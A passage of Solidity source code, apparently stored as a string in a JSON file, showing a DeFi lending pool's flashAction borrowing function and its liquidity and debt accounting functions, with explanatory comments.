on leverage.\n     * @param amountBorrowed The amount of underlying ERC20 tokens to be lent out.\n     * @param account The address of the Arcadia Account backing the debt.\n     * @param actionTarget The address of the Action Target to call.\n     * @param actionData A bytes object containing three actionAssetData structs, an address array and a bytes array.\n     * @param referrer A unique identifier of the referrer, who will receive part of the fees generated by this transaction.\n     * @dev The sender might be different than the owner if they have the proper allowances.\n     * @dev accountManagementAction() works similar to flash loans, this function optimistically calls external logic and checks for the Account state at the very end.\n     */\n    function flashAction(\n        uint256 amountBorrowed,\n        address account,\n        address actionTarget,\n        bytes calldata actionData,\n        bytes3 referrer\n    ) external whenBorrowNotPaused processInterests {\n        // If Account is not an actual address of a Account, ownerOfAccount(address) will return the zero address.\n        address accountOwner = IFactory(ACCOUNT_FACTORY).ownerOfAccount(account);\n        if (accountOwner == address(0)) revert LendingPoolErrors.IsNotAnAccount();\n\n        uint256 amountBorrowedWithFee = amountBorrowed + amountBorrowed.mulDivUp(originationFee, ONE_4);\n\n        // Check allowances to take debt.\n        if (accountOwner != msg.sender) {\n            // Since calling accountManagementAction() gives the sender full control over all assets in the Account,\n            // Only Beneficiaries with maximum allowance can call the flashAction function.\n            if (creditAllowance[account][accountOwner][msg.sender] != type(uint256).max) {\n                revert LendingPoolErrors.Unauthorized();\n            }\n        }\n\n        // Mint debt tokens to the Account, debt must be minted before the actions in the Account are performed.\n        _deposit(amountBorrowedWithFee, account);\n\n        // Add origination fee to the treasury.\n        unchecked {\n            if (amountBorrowedWithFee - amountBorrowed > 0) {\n                totalRealisedLiquidity += SafeCastLib.safeCastTo128(amountBorrowedWithFee - amountBorrowed);\n                realisedLiquidityOf[treasury] += amountBorrowedWithFee - amountBorrowed;\n            }\n        }\n\n        // Need to update the actionTimestamp before transferring tokens,\n        // or ERC777s could reenter to frontrun Account transfers.\n        IAccount(account).updateActionTimestampByCreditor();\n\n        // Send Borrowed funds to the actionTarget.\n        asset.safeTransfer(actionTarget, amountBorrowed);\n\n        // The Action Target will use the borrowed funds (optionally with additional assets withdrawn from the Account)\n        // to execute one or more actions (swap, deposit, mint...).\n        // Next the action Target will deposit any of the remaining funds or any of the recipient token\n        // resulting from the actions back into the Account.\n        // As last step, after all assets are deposited back into the Account a final health check is done:\n        // The Collateral Value of all assets in the Account is bigger than the total liabilities against the Account (including the debt taken during this function).\n        // flashActionByCreditor also checks that the Account indeed has opened a margin account for this Lending Pool.\n        {\n            uint256 accountVersion = IAccount(account).flashActionByCreditor(actionTarget, actionData);\n            if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();\n        }\n\n        unchecked {\n            emit Borrow(\n                account, msg.sender, actionTarget, amountBorrowed, amountBorrowedWithFee - amountBorrowed, referrer\n            );\n        }\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                            ACCOUNTING LOGIC\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Returns the total amount of outstanding debt in the underlying asset.\n     * @return totalDebt The total debt in underlying assets.\n     */\n    function totalAssets() public view override returns (uint256 totalDebt) {\n        // Avoid a second calculation of unrealised debt (expensive)\n        // if interests are already synced this block.\n        if (lastSyncedTimestamp != uint32(block.timestamp)) {\n            totalDebt = realisedDebt + calcUnrealisedDebt();\n        } else {\n            totalDebt = realisedDebt;\n        }\n    }\n\n    /**\n     * @notice Returns the total redeemable amount of liquidity in the underlying asset.\n     * @return totalLiquidity_ The total redeemable amount of liquidity in the underlying asset.\n     */\n    function totalLiquidity() external view returns (uint256 totalLiquidity_) {\n        // Avoid a second calculation of unrealised debt (expensive)\n        // if interests are already synced this block.\n        if (lastSyncedTimestamp != uint32(block.timestamp)) {\n            // The total liquidity equals the sum of the realised liquidity, and the pending interests.\n            unchecked {\n                totalLiquidity_ = totalRealisedLiquidity + calcUnrealisedDebt();\n            }\n        } else {\n            totalLiquidity_ = totalRealisedLiquidity;\n        }\n    }\n\n    /**\n     * @notice Returns the redeemable amount of liquidity in the underlying asset of an address.\n     * @param owner_ The address of the liquidity provider.\n     * @return assets The redeemable amount of liquidity in the underlying asset.\n     * @dev This function syncs the interests to prevent calculating UnrealisedDebt twice when depositing/withdrawing through the Tranches.\n     * @dev After calling this function, the interest rate will not be updated until the next processInterests() call.\n     */\n    function liquidityOfAndSync(address owner_) external returns (uint256 assets) {\n        _syncInterests();\n        assets = realisedLiquidityOf[owner_];\n    }\n\n    /**\n     * @notice Returns the redeemable amount of liquidity in the underlying asset of an address.\n     * @param owner_ The address of the liquidity provider.\n     * @return assets The redeemable amount of liquidity in the underlying asset.\n     */\n    function liquidityOf(address owner_) external view returns (uint256 assets) {\n        // Avoid a second calculation of unrealised debt (expensive).\n        // if interests are already synced this block.\n        if (lastSyncedTimestamp != uint32(block.timestamp)) {\n            // The total liquidity of a tranche equals the sum of the realised liquidity\n            // of the tranche, and its pending interests.\n            uint256 interest = calcUnrealisedDebt().mulDivDown(interestWeight[owner_], totalInterestWeight);\n            unchecked {\n                assets = realisedLiquidityOf[owner_] + interest;\n            }\n        } else {\n            assets = realisedLiquidityOf[owner_];\n        }\n    }\n\n    /**\n     * @notice Skims any surplus funds in the LendingPool to the treasury.\n     * @dev In normal conditions (when there are no ongoing auctions), the total Claimable Liquidity should be equal\n     * to the sum of the available funds (the balanceOf() the underlying asset) in the pool and the total open debt.\n     * In practice the actual sum of available funds and total open debt will always be bigger than the total Claimable Liquidity.\n     * This because of the rounding errors of the ERC4626 calculations (conversions between assets and shares),\n     * or because someone accidentally sent funds directly to the"
    }
  ]
}